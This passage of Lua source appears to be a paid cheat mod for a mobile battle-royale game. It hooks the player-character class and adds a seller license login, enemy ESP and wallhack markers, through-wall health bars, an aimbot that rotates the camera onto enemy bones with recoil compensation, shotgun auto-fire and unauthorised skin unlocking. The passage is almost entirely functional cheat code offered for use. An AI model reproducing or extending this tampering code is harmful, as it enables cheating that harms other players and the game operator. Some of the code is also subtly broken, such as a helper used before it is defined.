      if self.ParachuteFormation and self.ParachuteFormation.ShouldApplyFormationCamera and self.ParachuteFormation:ShouldApplyFormationCamera() then
        self.ParachuteFormation:OverlayFormationCameraParams()
        print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteFalling - Formation camera overlaid")
      end
    end

    function BRPlayerCharacterBase:SwitchCameraToNormal()
      print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToNormal")
      self.Super:SwitchCameraToNormal()
      if self.ParachuteFormation and self.ParachuteFormation.OnLandingClearFormationCamera then
        self.ParachuteFormation:OnLandingClearFormationCamera()
      end
    end

    function BRPlayerCharacterBase:SwitchWeaponCheck(Slot, IgnoreState)
      if self:HasState(EPawnState.AttachToOther) then
        local Weapon = self:GetWeaponBySlot(Slot)
        if slua.isValid(Weapon) then
          local WeaponID = Weapon:GetWeaponID()
          local AttachToOtherConfig = GamePlayTools.GetCurrentConfig("AttachToOtherConfig")
          if AttachToOtherConfig and AttachToOtherConfig.CheckIsWeaponInBlackList and AttachToOtherConfig.CheckIsWeaponInBlackList(WeaponID) then
            print(bWriteLog and "BRPlayerCharacterBase:SwitchWeaponCheck not allow switch weapon in AttachToOther, WeaponID: " .. tostring(WeaponID))
            local uPlayerController = self:GetPlayerControllerSafety()
            if Client and slua.isValid(uPlayerController) and uPlayerController.Role == ENetRole.ROLE_AutonomousProxy then
              uPlayerController:DisplayGameTipWithMsgID(47306)
            end
            return false
          end
        end
      end
      if self:HasState(EPawnState.WebSwing) and Slot ~= ESurviveWeaponPropSlot.SWPS_None and slua.isValid(self.STCharacterMovement) then
        local SpiderSwingObj = self.STCharacterMovement:GetSpecialMoveObjBySpecialMoveType(ESpecialMovementType.SPECIAL_MOVE_SpiderSwing)
        if slua.isValid(SpiderSwingObj) then
          local nCurState = SpiderSwingObj:GetCurMoveState()
          if nCurState == ESpiderSwingMoveState.Launching or nCurState == ESpiderSwingMoveState.Swinging then
            print(bWriteLog and "BRPlayerCharacterBase:SwitchWeaponCheck blocked by SpiderSwing state: " .. tostring(nCurState))
            return false
          end
        end
      end
      return self.Super:SwitchWeaponCheck(Slot, IgnoreState)
    end

    local VICTORY_DANCE_FX_MAP = {
      [12219601] = 22010089
    }
    local PublishRegionMacros = require("client.slua.config.ClientMacros.PublishRegionMacros")
    local isFitVersion = PublishRegionMacros.IsFITVersion()

    function ResolveEmoteResID(ItemID)
      local FxID = VICTORY_DANCE_FX_MAP[ItemID]
      if not FxID or FxID == ItemID then
        return ItemID
      end
      if isFitVersion and ItemID == 12219601 then
        print(bWriteLog and "BRPlayerCharacterBase ResolveEmoteResID 12219601 to 12222069")
        return 12222069
      end
      local model_util = require("client.common.model_util")
      local FxBPID = model_util.GetBPID(FxID)
      local ResID = ItemID
      if FxBPID and 0 < FxBPID and model_util.IsBattleItemHandleExist("Emote", FxBPID, false, false) then
        ResID = FxID
      end
      print(bWriteLog and string.format("BRPlayerCharacterBase 11 ResolveEmoteResID ItemID:%s, FxID:%s, FxBPID:%s, ResID:%s", tostring(ItemID), tostring(FxID), tostring(FxBPID), tostring(ResID)))
      return ResID
    end

    function BRPlayerCharacterBase:GetEmoteHandlePath(ItemID)
      local ResID = ResolveEmoteResID(ItemID)
      if self.Super then
        return self.Super:GetEmoteHandlePath(ResID)
      end
      local model_util = require("client.common.model_util")
      local BPID = model_util.GetBPID(ResID)
      if not BPID or BPID <= 0 then
        return ""
      end
      return model_util.GetPath("Emote", BPID, false, false) or ""
    end

    function BRPlayerCharacterBase:GetEmoteHandle(ItemID)
      local ResID = ResolveEmoteResID(ItemID)
      if self.Super then
        return self.Super:GetEmoteHandle(ResID)
      end
      local model_util = require("client.common.model_util")
      local BPID = model_util.GetBPID(ResID)
      if not BPID or BPID <= 0 then
        return nil
      end
      local HandleClass = model_util.GetClass("Emote", BPID, false, false)
      if not HandleClass then
        return nil
      end
      local Handle = HandleClass()
      if not slua.isValid(Handle) then
        return nil
      end
      return Handle
    end
    return BRPlayerCharacterBase
end)()

_G.__ORIGINAL_BR_PLAYER_CHARACTER_BASE__ = OriginalGameBRPlayerCharacterBase

-- ============================================================================
-- 14. BRPlayerCharacterBase — MOD Hook Layer
-- ============================================================================
local BRPlayerCharacterBase = OriginalGameBRPlayerCharacterBase or {}

local OriginalCtor = BRPlayerCharacterBase.ctor
function BRPlayerCharacterBase:ctor()
    if OriginalCtor then OriginalCtor(self) end
    self.AK_NativeESP_Ready = false
end

local OriginalPostConstruct = BRPlayerCharacterBase._PostConstruct
function BRPlayerCharacterBase:_PostConstruct()
    OriginalPostConstruct(self)
    self:StartAdvancedSystems()
end

local OriginalReceiveBeginPlay = BRPlayerCharacterBase.ReceiveBeginPlay
function BRPlayerCharacterBase:ReceiveBeginPlay()
    OriginalReceiveBeginPlay(self)
    if Client then
        pcall(TryAttachMaintenance)
        pcall(ObserveReadiness)
    end
end

local OriginalReceiveEndPlay = BRPlayerCharacterBase.ReceiveEndPlay
function BRPlayerCharacterBase:ReceiveEndPlay(endPlayReason)
    OriginalReceiveEndPlay(self, endPlayReason)
end

-- ============================================================================
-- 15. START SYSTEMS
-- ============================================================================
function BRPlayerCharacterBase:StartAdvancedSystems()
    if not Client then return end
    YourSellerESPEnsureLicense()
    InitDistanceMarkerSystem()

    self:AddGameTimer(0.5, true, function()
        if not slua.isValid(self.Object) then return end
        pcall(TryAttachMaintenance)
        pcall(ObserveReadiness)
        if not self.AK_NativeESP_Ready then
            pcall(function()
                local gameplayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
                local smc = gameplayTools.GetCurrentConfig("ScreenMarkConfig")
                if smc then
                    if not smc[1006] then
                        smc[1006] = {
                            UIPathName = distanceMarkerConfig.UIPathName,
                            MaxWidgetNum = 99,
                            MaxShowDistance = 6000000,
                            bBindOutScreen = true,
                            bBindBlocked = true,
                            bIsBindingActor = true,
                            BindSocketName = "head",
                            bUseLuaWorldSocketName = true,
                            WorldPositionOffset = FVector(0, 0, 50),
                            bNeedPreLoad = true,
                            Priority = 2,
                        }
                    else
                        smc[1006].bBindBlocked = true
                        smc[1006].bBindOutScreen = true
                        smc[1006].MaxWidgetNum = 99
                        smc[1006].MaxShowDistance = 6000000
                    end
                    smc[9999] = distanceMarkerConfig
                end
                self.AK_NativeESP_Ready = true
            end)
        end
    end)

self:AddGameTimer(0.8, true, function()
    if not slua.isValid(self.Object) then return end
    if not CheckExpiration() then return end

    local localPlayer = GameplayData.GetPlayerCharacter()
    if not slua.isValid(localPlayer) or self.Object ~= localPlayer then return end

    _G.AKModTickCount = (_G.AKModTickCount or 0) + 1
    if _G.AKModTickCount % 6 == 0 then cleanupDeadEnemyMarks() end

    local enemies = GameplayData.GetAllPlayerCharacters
        and GameplayData.GetAllPlayerCharacters() or {}
        local isMapESP = _G.AK_GetVal("ESP_MAP")

        for _, enemy in pairs(enemies) do
            if slua.isValid(enemy) and enemy ~= localPlayer
                and enemy.TeamID ~= localPlayer.TeamID then
                local isDead = false
                pcall(function()
                    if type(enemy.IsDead) == "function" then isDead = enemy:IsDead()
                    elseif enemy.bIsDead then isDead = true end
                    if enemy.bHidden or (enemy.Mesh and enemy.Mesh.bHidden) then isDead = true end
                end)
                if not isDead then
    processEnemyMapESP(enemy, localPlayer, isMapESP)
    -- ✅ Native HP bar marker (dono ESP_HP aur EspNameHP ke liye)
    local wantNativeHP = (_G.AK_GetVal("ESP_HP") == 1) 
                      or (_G.AK_GetVal("EspNameHP") == 1)
    if wantNativeHP then
        if not enemy.bHasAKNativeHPBar then
            pcall(function()
                enemy.NativeHPBarMark = InGameMarkTools.ClientAddMapMark(
                    1006, FVector(0,0,0), 0, "", 4, enemy)
                enemy.bHasAKNativeHPBar = true
            end)
        end
    elseif enemy.bHasAKNativeHPBar then
        pcall(function()
            InGameMarkTools.ClientRemoveMapMark(enemy.NativeHPBarMark)
        end)
        enemy.bHasAKNativeHPBar = false
    end
else
    -- ✅ Dead enemy ka native marker bhi hatao
    if enemy.bHasAKNativeHPBar then
        pcall(function()
            InGameMarkTools.ClientRemoveMapMark(enemy.NativeHPBarMark)
        end)
        enemy.bHasAKNativeHPBar = false
    end
end
            end
                end
    end)  -- AddGameTimer کا end
end      -- StartAdvancedSystems کا end

-- ============================================================================
-- 16. BOOTSTRAP
-- ============================================================================
pcall(function()
    YourSellerESPEnsureLicense()
    TryAttachMaintenance()
    local ticker = require("common.time_ticker")
    if ticker and ticker.AddTimerOnce then
        ticker.AddTimerOnce(1, function()
            TryAttachMaintenance()
            pcall(ObserveReadiness)
        end)
        ticker.AddTimerOnce(2, function()
            TryAttachMaintenance()
            pcall(ObserveReadiness)
        end)
        ticker.AddTimerOnce(3, function()
            if CheckExpiration() then _G.TryShowWelcome() end
        end)
    end
end)

-- ============================================================================
-- 17. RESUME MAINTENANCE
-- ============================================================================
function CombinedInstance.ResumeMaintenance()
    pcall(TryAttachMaintenance)
    pcall(ObserveReadiness)
end

-- ============================================================================
-- 18. PUBLIC API
-- ============================================================================
function _G.YourSellerLicenseLogin(key)
    YourSellerESPEnsureLicense()
    if not YourSellerESPLicenseInstance then return false, 'license_unavailable' end
    local ok, result = pcall(YourSellerESPLicenseInstance.login, YourSellerESPLicenseInstance, key)
    if not ok then return false, 'license_unavailable' end
    return result
end

function _G.YourSellerLicenseLogout()
    if not YourSellerESPLicenseInstance then return false end
    return pcall(YourSellerESPLicenseInstance.logout, YourSellerESPLicenseInstance)
end

function _G.YourSellerLicenseStatus()
    YourSellerESPEnsureLicense()
    if not YourSellerESPLicenseInstance then
        return {authorized = false, phase = 'locked', message = 'license_unavailable'}
    end
    local ok, value = pcall(YourSellerESPLicenseInstance.getStatus, YourSellerESPLicenseInstance)
    return ok and value or {authorized = false, phase = 'locked'}
end

function _G.YourSellerESPGetMatchState()
    return {
        ready = MatchState.ready,
        readySince = MatchState.readySince,
        world = MatchState.world,
        attempts = MatchState.attempts,
        lastError = MatchState.lastError,
        renderersStarted = MatchState.renderersStarted,
        lastStartError = MatchState.lastStartError,
        boxActive = ESPBoxRenderer and ESPBoxRenderer.IsActive and ESPBoxRenderer.IsActive() or false,
        wallhackActive = WallhackRenderer and WallhackRenderer.IsActive and WallhackRenderer.IsActive() or false,
        hpCanvasActive = ESPHealthRenderer and ESPHealthRenderer.Canvas ~= nil or false,
        distCanvasActive = ESPDistanceRenderer and ESPDistanceRenderer.Canvas ~= nil or false,
        lineActive = ESPLineRenderer ~= nil,
        counterActive = EnemyCounterOverlay and EnemyCounterOverlay.Container ~= nil or false,
        maintenanceOwner = MaintenanceState.owner ~= nil,
        maintenanceTimer = MaintenanceState.timer ~= nil,
    }
end

function BRPlayerCharacterBase:GetESPStatus()
    local status = {state = 'idle'}
    if YourSellerESPLicenseInstance then
        local ok, value = pcall(YourSellerESPLicenseInstance.getStatus, YourSellerESPLicenseInstance)
        status.license = ok and value or {authorized = false}
    end
    status.match = _G.YourSellerESPGetMatchState()
    return status
end

function BRPlayerCharacterBase:SubmitESPKey(key) return _G.YourSellerLicenseLogin(key) end
function BRPlayerCharacterBase:LogoutESP()     return _G.YourSellerLicenseLogout() end


-- ==========================================
-- AIMBOT TOUCH LOGIC
-- ==========================================
_G.GetEnemyTargetsFromActors = function(radius)
    local result = {}
    local player = GameplayData.GetPlayerCharacter()
    if not slua.isValid(player) then
        return result
    end
    local allCharacters = {}
    if GameplayData.GetAllPlayerCharacters then
        allCharacters = GameplayData.GetAllPlayerCharacters()
    elseif GameplayData.GameCharacters then
        for _, char in pairs(GameplayData.GameCharacters) do table.insert(allCharacters, char) end
    end
    local myTeam = player:GetTeamID()
    for _, actor in pairs(allCharacters) do
        if slua.isValid(actor) and actor ~= player and actor.GetTeamID and actor:IsAlive() then
            if actor:GetTeamID() ~= myTeam then
                local dist = player:GetDistanceTo(actor)
                if dist <= radius then
                    table.insert(result, actor)
                end
            end
        end
    end
    return result
end

_G.AimTouch = function()
    pcall(function()
        if not _G.YourSellerConfig.AimTouchEnable then return end
        local player = GameplayData.GetPlayerCharacter()
        if not slua.isValid(player) then return end
        local pc = player:GetPlayerControllerSafety()
        if not slua.isValid(pc) then return end
        local isFiring = player.bIsWeaponFiring
        local isADS = player.bIsGunADS
        local weapon = player.WeaponManagerComponent and player.WeaponManagerComponent.CurrentWeaponReplicated
        if not weapon and type(player.GetCurrentShootWeapon) == "function" then
            weapon = player:GetCurrentShootWeapon()
        end
        
        -- CHECK SHOTGUN / SNIPER
        local isShotgun = false
        local isSniper = false
        local currentAmmo = 1
        if slua.isValid(weapon) then
            local wID = type(weapon.GetWeaponID) == "function" and weapon:GetWeaponID() or 0
            local wName = type(weapon.GetWeaponName) == "function" and weapon:GetWeaponName() or ""
            
            if (wID >= 1030000 and wID < 1040000) or wName:find("S686") or wName:find("S1897") or wName:find("S12") or wName:find("DBS") or wName:find("M1014") then 
                isShotgun = true 
            end
            
            if wName:find("Kar98") or wName:find("M24") or wName:find("AWM") or wName:find("Mosin") or wName:find("Win94") or wName:find("AMR") or wName:find("SKS") or wName:find("SLR") or wName:find("Mini") or wName:find("Mk14") or wName:find("QBU") or wName:find("Mk12") or wName:find("VSS") then
                isSniper = true
            end
            if type(weapon.GetCurrentAmmo) == "function" then
                currentAmmo = weapon:GetCurrentAmmo()
            elseif weapon.ShootWeaponComponent and type(weapon.ShootWeaponComponent.GetCurrentAmmo) == "function" then
                currentAmmo = weapon.ShootWeaponComponent:GetCurrentAmmo()
            elseif weapon.CurrentAmmo ~= nil then
                currentAmmo = weapon.CurrentAmmo
            end
        end

        if _G.YourSeller.IsAutoFiring then
            pcall(function()
                player.bIsWeaponFiring = false
                if type(player.SetIsWeaponFiring) == "function" then player:SetIsWeaponFiring(false) end
                if slua.isValid(pc) and type(pc.SetIsWeaponFiring) == "function" then pc:SetIsWeaponFiring(false) end
                local wepMgr = player.WeaponManagerComponent
                if slua.isValid(wepMgr) then wepMgr.bIsWeaponFiring = false end
            end)
            _G.YourSeller.IsAutoFiring = false
        end

        -- SHOTGUN OUT OF AMMO STOP
        if isShotgun and currentAmmo <= 0 then
            return
        end

        local cond = 2
        local prioMode = 1
        local boneIdx = 1
        local speedVal = 50
        local fovVal = 30
        local maxDistMeters = 50
        local useVisCheck = false
        local igKnock = false
        local igBot = false
        local predVal = 0 
        local recoilCompVal = 0 

        -- SHOTGUN AIMBOT
        if isShotgun and _G.YourSellerConfig.AimTouchSG then
            cond = _G.YourSeller.CustomTextData.AimTouchSGCond or 1
            if _G.YourSellerConfig.AimTouchSGAutoFire then cond = 2 end
            if cond == 1 and not isFiring then return end
            prioMode = _G.YourSeller.CustomTextData.AimTouchSGPrio or 1
            boneIdx = _G.YourSeller.CustomTextData.AimTouchSGBone or 2
            speedVal = _G.YourSeller.CustomTextData.AimTouchSGSpeed or 80
            fovVal = _G.YourSeller.CustomTextData.AimTouchSGFOV or 40
            maxDistMeters = _G.YourSeller.CustomTextData.AimTouchSGDist or 30
            useVisCheck = _G.YourSellerConfig.AimTouchSGVisCheck
            igKnock = _G.YourSellerConfig.AimTouchSGIgKnock
            igBot = _G.YourSellerConfig.AimTouchSGIgBot
        elseif isADS then
            if isSniper and _G.YourSellerConfig.AimTouchScopeSniper then
                cond = _G.YourSeller.CustomTextData.AimTouchSniperCond or 2
                if cond == 1 and not isFiring then return end
                prioMode = _G.YourSeller.CustomTextData.AimTouchSniperPrio or 1
                boneIdx = _G.YourSeller.CustomTextData.AimTouchSniperBone or 1
                speedVal = _G.YourSeller.CustomTextData.AimTouchSniperSpeed or 30
                fovVal = _G.YourSeller.CustomTextData.AimTouchSniperFOV or 20
                maxDistMeters = _G.YourSeller.CustomTextData.AimTouchSniperDist or 400
                useVisCheck = _G.YourSellerConfig.AimTouchSniperVisCheck
                igKnock = _G.YourSellerConfig.AimTouchSniperIgKnock
                igBot = _G.YourSellerConfig.AimTouchSniperIgBot
                predVal = _G.YourSeller.CustomTextData.AimTouchSniperPred or 0
            elseif _G.YourSellerConfig.AimTouchScopeAll then
                cond = _G.YourSeller.CustomTextData.AimTouchScopeCond or 1
                if cond == 1 and not isFiring then return end
                prioMode = _G.YourSeller.CustomTextData.AimTouchScopePrio or 1
                boneIdx = _G.YourSeller.CustomTextData.AimTouchScopeBone or 2
                speedVal = _G.YourSeller.CustomTextData.AimTouchScopeSpeed or 40
                fovVal = _G.YourSeller.CustomTextData.AimTouchScopeFOV or 20
                maxDistMeters = _G.YourSeller.CustomTextData.AimTouchScopeDist or 300
                useVisCheck = _G.YourSellerConfig.AimTouchScopeVisCheck
                igKnock = _G.YourSellerConfig.AimTouchScopeIgKnock
                igBot = _G.YourSellerConfig.AimTouchScopeIgBot
                predVal = _G.YourSeller.CustomTextData.AimTouchScopePred or 0 
                recoilCompVal = _G.YourSeller.CustomTextData.AimTouchScopeRecoil or 0
            else
                return
            end
        else
            if not _G.YourSellerConfig.AimTouchHipfire then return end
            cond = _G.YourSeller.CustomTextData.AimTouchHipCond or 1
            if cond == 1 and not isFiring then return end 
            prioMode = _G.YourSeller.CustomTextData.AimTouchHipPrio or 1
            boneIdx = _G.YourSeller.CustomTextData.AimTouchHipBone or 1
            speedVal = _G.YourSeller.CustomTextData.AimTouchHipSpeed or 50
            fovVal = _G.YourSeller.CustomTextData.AimTouchHipFOV or 30
            maxDistMeters = _G.YourSeller.CustomTextData.AimTouchHipDist or 250
            useVisCheck = _G.YourSellerConfig.AimTouchHipVisCheck
            igKnock = _G.YourSellerConfig.AimTouchHipIgKnock
            igBot = _G.YourSellerConfig.AimTouchHipIgBot
        end

        local currentMaxDist = maxDistMeters * 100
        local enemies = _G.GetEnemyTargetsFromActors(currentMaxDist)
        if not enemies or #enemies == 0 then return end
        local FVector2D = import("Vector2D")
        local UGameplayStatics = import("GameplayStatics")
        local KismetMathLibrary = import("KismetMathLibrary")
        local camManager = UGameplayStatics.GetPlayerCameraManager(pc, 0)
        if not slua.isValid(camManager) then return end
        local camLoc = camManager:GetCameraLocation()
        if not camLoc then return end
        local ui_util = require("client.common.ui_util")
        if not ui_util then return end
        local viewportSize = ui_util.GetViewportSize()
        if not viewportSize then return end
        local centerX = viewportSize.X * 0.5
        local centerY = viewportSize.Y * 0.5
        local FOV_RADIUS = (fovVal / 100.0) * (viewportSize.X / 2.0)
        local bestTarget = nil
        local bestScore = 99999999 
        local selBoneName = "head"
        if boneIdx == 1 then selBoneName = "head"
        elseif boneIdx == 2 then selBoneName = "spine_03"
        elseif boneIdx == 3 then selBoneName = "spine_01"
        elseif boneIdx == 4 then selBoneName = "pelvis" end
        
        for i, target in ipairs(enemies) do
            if not slua.isValid(target) then goto continue end
            pcall(function()
                if slua.isValid(target.Mesh) then
                    target.Mesh.MeshComponentUpdateFlag = 0
                end
            end)
            if igKnock and target.HealthStatus == 1 then goto continue end
            if igBot then
                local tIsBot = false
                if target.bIsAI == true or target.IsAI == true then tIsBot = true end
                local pState = target.PlayerState
                if slua.isValid(pState) and (pState.bIsABot or pState.bIsBot) then tIsBot = true end
                if tIsBot then goto continue end
            end
            if useVisCheck then
                local curTime = os.clock()
                local tId = type(target.GetUniqueID) == "function" and target:GetUniqueID() or tostring(target)
                _G.AimTouchVisCache = _G.AimTouchVisCache or {}
                if not _G.AimTouchVisCache[tId] or (curTime - _G.AimTouchVisCache[tId].time) > 0.2 then
                    local isHidden = true
                    pcall(function() if pc:LineOfSightTo(target) then isHidden = false end end)
                    _G.AimTouchVisCache[tId] = { hidden = isHidden, time = curTime }
                end
                if _G.AimTouchVisCache[tId].hidden then goto continue end
            end
            
            local tPos = target:GetBonePos(selBoneName, {X=0, Y=0, Z=0})
            if not tPos or (tPos.X == 0 and tPos.Y == 0 and tPos.Z == 0) then
                if type(target.GetSocketLocation) == "function" then
                    tPos = target:GetSocketLocation(selBoneName)
                end
            end
            if not tPos or (tPos.X == 0 and tPos.Y == 0 and tPos.Z == 0) then
                if type(target.K2_GetActorLocation) == "function" then
                    tPos = target:K2_GetActorLocation()
                    if tPos then
                        if boneIdx == 1 then tPos.Z = tPos.Z + 70
                        elseif boneIdx == 2 then tPos.Z = tPos.Z + 40
                        elseif boneIdx == 3 then tPos.Z = tPos.Z + 20 end
                    end
                end
            end
            if not tPos or (tPos.X == 0 and tPos.Y == 0 and tPos.Z == 0) then goto continue end
            local screen = FVector2D()
            local success = pc:ProjectWorldLocationToScreen(tPos, screen, false)
            if not success or screen.X <= 0 or screen.Y <= 0 then goto continue end
            local dx = screen.X - centerX
            local dy = screen.Y - centerY
            local distScreen = math.sqrt(dx*dx + dy*dy)
            if distScreen > FOV_RADIUS then goto continue end
            local currentScore = distScreen
            if prioMode == 2 then currentScore = player:GetDistanceTo(target)
            elseif prioMode == 3 then currentScore = target.Health or 100
            elseif prioMode == 4 then 
                local hp = target.Health or 100
                local maxhp = target.HealthMax or 100
                if maxhp <= 0 then maxhp = 100 end
                currentScore = hp / maxhp
            end
            if currentScore < bestScore then
                bestScore = currentScore
                bestTarget = target
            end
            ::continue::
        end
        
        if not slua.isValid(bestTarget) then return end
        local finalBonePos = bestTarget:GetBonePos(selBoneName, {X=0, Y=0, Z=0})
        if not finalBonePos or (finalBonePos.X == 0 and finalBonePos.Y == 0 and finalBonePos.Z == 0) then
            if type(bestTarget.GetSocketLocation) == "function" then
                finalBonePos = bestTarget:GetSocketLocation(selBoneName)
            end
        end
        if not finalBonePos or (finalBonePos.X == 0 and finalBonePos.Y == 0 and finalBonePos.Z == 0) then
            if type(bestTarget.K2_GetActorLocation) == "function" then
                finalBonePos = bestTarget:K2_GetActorLocation()
                if finalBonePos then
                    if boneIdx == 1 then finalBonePos.Z = finalBonePos.Z + 70
                    elseif boneIdx == 2 then finalBonePos.Z = finalBonePos.Z + 40
                    elseif boneIdx == 3 then finalBonePos.Z = finalBonePos.Z + 20 end
                end
            end
        end
        if not finalBonePos or (finalBonePos.X == 0 and finalBonePos.Y == 0 and finalBonePos.Z == 0) then return end
        
        if predVal > 0 then
            pcall(function()
                local tVelocity = nil
                if type(bestTarget.GetVelocity) == "function" then
                    tVelocity = bestTarget:GetVelocity()
                end
                if tVelocity and (tVelocity.X ~= 0 or tVelocity.Y ~= 0) then
                    local distToEnemy = player:GetDistanceTo(bestTarget) / 100.0
                    local ToF = (distToEnemy / 800.0) * (predVal / 50.0)
                    finalBonePos.X = finalBonePos.X + (tVelocity.X * ToF)
                    finalBonePos.Y = finalBonePos.Y + (tVelocity.Y * ToF)
                end
            end)
        end
        
        local rot = KismetMathLibrary.FindLookAtRotation(camLoc, finalBonePos)
        if not rot then return end
        local currentRot = pc:GetControlRotation()
        if not currentRot then return end
        local deltaYaw = rot.Yaw - currentRot.Yaw
        local deltaPitch = rot.Pitch - currentRot.Pitch
        
        if isADS then
            local camRot = nil
            if type(camManager.GetCameraRotation) == "function" then
                camRot = camManager:GetCameraRotation()
            end
            if camRot then
                deltaYaw = deltaYaw - (camRot.Yaw - currentRot.Yaw)
                deltaPitch = deltaPitch - (camRot.Pitch - currentRot.Pitch)
            end
        end
        
        if deltaYaw > 180 then deltaYaw = deltaYaw - 360 end
        if deltaYaw < -180 then deltaYaw = deltaYaw + 360 end
        if deltaPitch > 180 then deltaPitch = deltaPitch - 360 end
        if deltaPitch < -180 then deltaPitch = deltaPitch + 360 end
        
        local smoothFactor = 0.0
        if speedVal >= 100 then
            smoothFactor = 1.0
        else
            smoothFactor = (speedVal / 100.0) * 0.3
            if smoothFactor < 0.01 then smoothFactor = 0.01 end
        end
        
        local finalPitch = currentRot.Pitch + (deltaPitch * smoothFactor)
        local finalYaw = currentRot.Yaw + (deltaYaw * smoothFactor)
        
        if recoilCompVal > 0 and isFiring then
            local pullDownForce = (recoilCompVal / 50.0) * 1.5
            finalPitch = finalPitch - pullDownForce
        end
        
        local finalRot = { Pitch = finalPitch, Yaw = finalYaw, Roll = 0 }
        pc:SetControlRotation(finalRot, "AimTouch")
        
        -- SHOTGUN AUTO FIRE
        if isShotgun and _G.YourSellerConfig.AimTouchSGAutoFire then
            pcall(function()
                local distToTarget = player:GetDistanceTo(bestTarget) / 100
                if distToTarget <= maxDistMeters then
                    player.bIsWeaponFiring = true
                    if type(player.SetIsWeaponFiring) == "function" then player:SetIsWeaponFiring(true) end
                    if slua.isValid(pc) and type(pc.SetIsWeaponFiring) == "function" then pc:SetIsWeaponFiring(true) end
                    local wepMgr = player.WeaponManagerComponent
                    if slua.isValid(wepMgr) then wepMgr.bIsWeaponFiring = true end
                    
                    local currentWep = player:GetCurrentWeapon()
                    if slua.isValid(currentWep) and type(currentWep.StartFire) == "function" then 
                        currentWep:StartFire() 
                    end
                    _G.YourSeller.IsAutoFiring = true
                end
            end)
        end
    end)
end


-- ==========================================
-- MAIN LOOP (WEAPON MODS + IPAD VIEW ONLY)
-- ==========================================
local function MainLoop()
    if not YourSellerESPLicenseInstance then return end
    local licensed = false
    pcall(function() licensed = YourSellerESPLicenseInstance:isActive() == true end)
    if not licensed then return end
    _G.InitModMenuTab()
    ShowModMenu()
    local okData, GameplayData = pcall(require, "GameLua.GameCore.Data.GameplayData")
    if not okData or not GameplayData then return end
    if not okData or not GameplayData then return end
    local pc = GameplayData.GetPlayerController()
    local localPlayer = nil
    if Valid(pc) then localPlayer = pc:GetPlayerCharacterSafety() end
    local _slua = rawget(_G, "slua")
    local function Valid(obj)
        if not obj then return false end
        if _slua and _slua.isValid then
            local ok, v = pcall(_slua.isValid, obj)
            if not ok or not v then return false end
        end
        return true
    end
    
        if _G.YourSeller.CustomTextData == nil then 
        _G.YourSeller.CustomTextData = {
            AimTouchHipPrio = 1,
            AimTouchHipBone = 1,
            AimTouchHipCond = 1,
            AimTouchHipSpeed = 50,
            AimTouchHipFOV = 30,
            AimTouchHipDist = 250,
            AimTouchSGPrio = 1,
            AimTouchSGBone = 2,
            AimTouchSGCond = 1,
            AimTouchSGSpeed = 80,
            AimTouchSGFOV = 40,
            AimTouchSGDist = 30,
            AimTouchScopePrio = 1,
            AimTouchScopeBone = 2,
            AimTouchScopeCond = 1,
            AimTouchScopeSpeed = 40,
            AimTouchScopeFOV = 20,
            AimTouchScopeDist = 300,
            AimTouchSniperPrio = 1,
            AimTouchSniperBone = 1,
            AimTouchSniperCond = 2,
            AimTouchSniperSpeed = 30,
            AimTouchSniperFOV = 20,
            AimTouchSniperDist = 400
        }
    end
    
        if _G.YourSellerConfig.UnlockFPS then InitializeGraphicsUnlock() end
    
    -- ========================================================
    -- FULL SKIN MOD LUA ACTIVE CODE
    -- ========================================================
    if _G.YourSellerConfig.ModSkin then
        if not _G.TDSkinLoopStarted then
            if _G.InitializeSkinModSystem then _G.InitializeSkinModSystem() end
            if _G.ForceRefreshSkinMaps then _G.ForceRefreshSkinMaps() end
            _G.TDSkinLoopStarted = true
        end
        _G.YourSeller.SkinWasApplied = true
        local curTime = os.clock()
        if not _G.LastSkinUpdateTime or (curTime - _G.LastSkinUpdateTime) > 1.5 then
            _G.LastSkinUpdateTime = curTime
            pcall(function()
                local isAlive = type(localPlayer.IsAlive) == "function" and localPlayer:IsAlive() or true
                if isAlive then
                    if _G.ReadLiveConfig then _G.ReadLiveConfig() end
                    if not _G.KillInfoCounterHacked and _G.ForceEnableKillCounterUI then _G.ForceEnableKillCounterUI() end
                    if _G.equip_character_avatar then _G.equip_character_avatar(localPlayer) end
                    if _G.ApplyWeaponSkins then _G.ApplyWeaponSkins(localPlayer) end
                    if _G.ApplyVehicleSkins then _G.ApplyVehicleSkins(localPlayer) end
                    if _G.HandlePetLogic then _G.HandlePetLogic() end
                    if _G.DeadBox_TemperRequest and _G.NeedCheckDeadBoxTimer > 0 then _G.DeadBox_TemperRequest(pc) end
                end
            end)
        end
    else
        if _G.YourSeller.SkinWasApplied then
            _G.OutfitMap = {}
            _G.WeaponSkinMap = {}
            _G.VehicleSkinMap = {}
            pcall(function()
                local WeaponManager = localPlayer:GetWeaponManager()
                if Valid(WeaponManager) then
                    for slot = 1, 3 do
                        local Weapon = WeaponManager:GetInventoryWeaponByPropSlot(slot)
                        if Valid(Weapon) and Valid(Weapon.synData) then
                            local WeaponID = Weapon:GetWeaponID()
                            local SkinData = Weapon.synData:Get(7)
                            if SkinData and SkinData.defineID then
                                SkinData.defineID.TypeSpecificID = WeaponID
                                Weapon.synData:Set(7, SkinData)
                                if Weapon.SetWeaponAvatarID then pcall(function() Weapon:SetWeaponAvatarID(WeaponID) end) end
                                if Weapon.DelayHandleAvatarMeshChanged then pcall(function() Weapon:DelayHandleAvatarMeshChanged() end) end
                            end
                        end
                    end
                end
                
                local Vehicle = localPlayer:GetCurrentVehicle()
                if Valid(Vehicle) then
                    local VehicleAvatar = Vehicle.VehicleAvatar or Vehicle.VehicleAvatarComponent_BP or Vehicle:GetAvatarComponent()
                    if Valid(VehicleAvatar) and type(VehicleAvatar.GetDefaultAvatarID) == "function" then
                        local defId = VehicleAvatar:GetDefaultAvatarID()
                        if VehicleAvatar.ChangeItemAvatar then VehicleAvatar:ChangeItemAvatar(defId, true) end
                    end
                end
                
                if localPlayer.AvatarComponent2 and type(localPlayer.AvatarComponent2.OnRep_BodySlotStateChanged) == "function" then
                    localPlayer.AvatarComponent2:OnRep_BodySlotStateChanged()
                end
            end)
            _G.YourSeller.SkinWasApplied = false
        end
        _G.TDSkinLoopStarted = false
    end
    
    
    if _G.YourSellerConfig.AimTouchEnable then
        _G.AimTouch()
    end
    
    -- ========================================================
    -- IPAD VIEW
    -- ========================================================
    if _G.YourSellerConfig.IpadView then
        pcall(function()
            local uTPPCam = localPlayer.ThirdPersonCameraComponent
            if Valid(uTPPCam) and not localPlayer.bIsWeaponAiming then
                local fov = _G.YourSeller.CustomTextData.IPadFov or 120
                if uTPPCam.FieldOfView ~= fov then
                    uTPPCam.FieldOfView = fov
                end
            end
        end)
